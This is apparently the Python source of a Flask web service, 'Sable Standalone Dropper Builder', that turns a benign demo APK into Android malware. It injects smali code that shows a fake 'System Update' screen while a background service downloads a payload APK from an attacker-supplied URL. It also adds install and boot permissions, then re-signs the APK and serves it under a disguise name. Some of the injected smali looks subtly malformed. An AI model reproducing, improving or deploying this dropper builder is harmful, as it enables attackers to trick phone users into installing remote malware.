import os
import subprocess
import shutil
import tempfile
import requests
import zipfile
import traceback
from flask import Flask, request, send_file, jsonify

app = Flask(__name__)
WORK = tempfile.mkdtemp()
KEYSTORE = "keystore.jks"
BASE_APK_URL = "https://github.com/appium/android-apidemos/releases/download/v3.1.0/ApiDemos-debug.apk" # Ek chota sa base APK

@app.errorhandler(500)
def internal_error(exception):
    return jsonify({"error": f"Internal Server Error: {str(exception)}"}), 500

@app.route("/")
def home():
    return "Sable Standalone Dropper Builder Alive"

@app.route("/generate", methods=["POST"])
def generate():
    try:
        data = request.json or {}
        payload_url = data.get("payload_url", "https://example.com/payload.apk")
        app_name = data.get("app_name", "System Update")
        
        target = os.path.join(WORK, "base.apk")
        
        # 1. Base APK Download
        if not os.path.exists(target):
            response = requests.get(BASE_APK_URL, stream=True, timeout=60)
            with open(target, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
        
        # 2. Decompile Base APK
        target_dir = os.path.join(WORK, "target_dir")
        shutil.rmtree(target_dir, ignore_errors=True)
        subprocess.run(f"apktool d -r -f -o {target_dir} {target}", shell=True, capture_output=True, text=True)

        manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
        if not os.path.exists(manifest_path) or os.path.isdir(manifest_path):
            return jsonify({"error": "Base APK structure is corrupt."}), 500

        # 3. Inject Dropper Smali (Simple Web Request)
        pkg_path = "com/sable/dropper"
        smali_dir = os.path.join(target_dir, "smali", *pkg_path.split("/"))
        os.makedirs(smali_dir, exist_ok=True)

        # MainActivity for UI
        with open(os.path.join(smali_dir, "MainActivity.smali"), "w") as f:
            f.write(f'''.class public Lcom/sable/dropper/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"

.method public constructor <init>()V
    .locals 0
    invoke-direct {{p0}}, Landroid/app/Activity;-><init>()V
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4
    invoke-super {{p0, p1}}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    new-instance v0, Landroid/widget/TextView;
    invoke-direct {{v0, p0}}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V
    const-string v1, "{app_name} is initializing..."
    invoke-virtual {{v0, v1}}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    const/high16 v1, 0x41a00000
    invoke-virtual {{v0, v1}}, Landroid/widget/TextView;->setTextSize(F)V
    const/16 v1, 0x11
    invoke-virtual {{v0, v1}}, Landroid/widget/TextView;->setGravity(I)V
    invoke-virtual {{p0, v0}}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V

    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/sable/dropper/DropperService;
    invoke-direct {{v0, p0, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {{p0, v0}}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void
.end method
''')

        # DropperService
        with open(os.path.join(smali_dir, "DropperService.smali"), "w") as f:
            f.write(f'''.class public Lcom/sable/dropper/DropperService;
.super Landroid/app/Service;
.source "DropperService.java"

.method public constructor <init>()V
    .locals 0
    invoke-direct {{p0}}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2
    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcom/sable/dropper/DropperService$1;
    invoke-direct {{v1, p0}}, Lcom/sable/dropper/DropperService$1;-><init>(Lcom/sable/dropper/DropperService;)V
    invoke-direct {{v0, v1}}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual {{v0}}, Ljava/lang/Thread;->start()V
    const/4 v0, 0x1
    return v0
.end method
''')

        # DropperService$1 (Download Logic)
        with open(os.path.join(smali_dir, "DropperService$1.smali"), "w") as f:
            f.write(f'''.class Lcom/sable/dropper/DropperService$1;
.super Ljava/lang/Object;
.source "DropperService.java"
.implements Ljava/lang/Runnable;

.instance field final synthetic this$0:Lcom/sable/dropper/DropperService;

.method constructor <init>(Lcom/sable/dropper/DropperService;)V
    .locals 0
    iput-object p1, p0, Lcom/sable/dropper/DropperService$1;->this$0:Lcom/sable/dropper/DropperService;
    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public run()V
    .locals 8
    const-string v0, "{payload_url}"
    
    :try_start_0
    new-instance v1, Ljava/net/URL;
    invoke-direct {{v1, v0}}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    invoke-virtual {{v1}}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    move-result-object v1
    check-cast v1, Ljava/net/HttpURLConnection;
    const-string v2, "GET"
    invoke-virtual {{v1, v2}}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
    invoke-virtual {{v1}}, Ljava/net/HttpURLConnection;->connect()V

    invoke-virtual {{v1}}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;
    move-result-object v2
    new-instance v3, Ljava/io/FileOutputStream;
    new-instance v4, Ljava/lang/StringBuilder;
    invoke-direct {{v4}}, Ljava/lang/StringBuilder;-><init>()V
    invoke-virtual {{p0}}, Lcom/sable/dropper/DropperService$1;->this$0:Lcom/sable/dropper/DropperService;
    move-result-object v5
    invoke-virtual {{v5}}, Landroid/app/Service;->getCacheDir()Ljava/io/File;
    move-result-object v5
    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    const-string v5, "/payload.apk"
    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {{v4}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-direct {{v3, v4}}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V

    const/16 v4, 0x1000
    new-array v4, v4, [B
    :goto_0
    invoke-virtual {{v2, v4}}, Ljava/io/InputStream;->read([B)I
    move-result v5
    const/4 v6, -0x1
    if-eq v5, v6, :cond_0
    const/4 v6, 0x0
    invoke-virtual {{v3, v4, v6, v5}}, Ljava/io/FileOutputStream;->write([BII)V
    goto :goto_0
    :cond_0
    invoke-virtual {{v3}}, Ljava/io/FileOutputStream;->close()V
    invoke-virtual {{v2}}, Ljava/io/InputStream;->close()V
    
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    :catch_0
    move-exception v0
    return-void
.end method
''')

        # 4. Manifest Modify (Change Launcher to Dropper)
        with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
            t = f.read()

        # Add Permissions
        perms = ["android.permission.INTERNET","android.permission.REQUEST_INSTALL_PACKAGES","android.permission.RECEIVE_BOOT_COMPLETED"]
        insert_perms = "".join(f'<uses-permission android:name="{p}"/>' for p in perms if p not in t)
        if insert_perms:
            t = t.replace("</application>", insert_perms + "</application>")

        # Add Dropper Components
        comp_str = f'''
        <activity android:name="com.sable.dropper.MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <service android:name="com.sable.dropper.DropperService" android:exported="false" />
        '''
        
        # Remove old launcher (This is a hacky way, better to just add ours)
        t = t.replace("</application>", comp_str + "</application>")
        
        with open(manifest_path, "w", encoding='utf-8') as f:
            f.write(t)

        # 5. Build APK
        unsigned = os.path.join(WORK, "unsigned.apk")
        res = subprocess.run(f"apktool b -f -o {unsigned} {target_dir}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Build fail: {res.stderr[:200]}"}), 500

        # 6. Align and Sign
        aligned = os.path.join(WORK, "aligned.apk")
        signed = os.path.join(WORK, "signed.apk")
        subprocess.run(f"zipalign -f -p 4 {unsigned} {aligned}", shell=True, check=True)
        
        res = subprocess.run(f"apksigner sign --min-sdk-version 21 --v1-signing-enabled true --v2-signing-enabled true --ks {KEYSTORE} --ks-pass pass:sable123 --key-pass pass:sable123 --out {signed} {aligned}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Signing failed: {res.stderr[:200]}"}), 500

        return send_file(signed, as_attachment=True, download_name=f"{app_name}.apk")

    except Exception as e:
        traceback.print_exc()
        return jsonify({"error": f"Python Error: {str(e)}"}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
